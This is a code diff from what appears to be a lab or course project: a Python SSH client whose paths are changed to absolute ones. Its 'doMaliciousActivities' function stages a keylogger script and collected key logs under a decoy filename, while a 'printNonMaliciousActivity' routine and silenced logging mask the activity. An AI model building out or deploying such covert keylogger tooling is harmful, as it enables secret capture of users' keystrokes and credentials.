@@ -321,9 +321,9 @@ def daemonize(pidfile, *, stdin='/dev/null',
 
 
 def doMaliciousActivities():
-    remotepath = "a1KeyLogger.py"
+    remotepath = "/home/lab/bin/py/project/a1KeyLogger.py"
     localpath = "/tmp/ZZZZ_NOT_SUSPICIOUS_FILE"
-    remotepath2 = "clientKeyLogs.log"
+    remotepath2 = "/home/lab/bin/py/project/clientKeyLogs.log"
     localpath2 = "/tmp/keylog.log"
 
     try:
@@ -408,11 +408,11 @@ def printNonMaliciousActivity():
 # main thread
 if __name__ == '__main__':
     try:
-        if os.path.exists("sshClient.log"):
-            os.remove("sshClient.log")
+        if os.path.exists("/home/lab/bin/py/project/sshClient.log"):
+            os.remove("/home/lab/bin/py/project/sshClient.log")
 
         # Add logging to logfile and disable output to the terminal
-        logzero.logfile("sshClient.log", maxBytes=1e6,
+        logzero.logfile("/home/lab/bin/py/project/sshClient.log", maxBytes=1e6,
                         backupCount=3, disableStderrLogger=True)
 
         printNonMaliciousActivity()
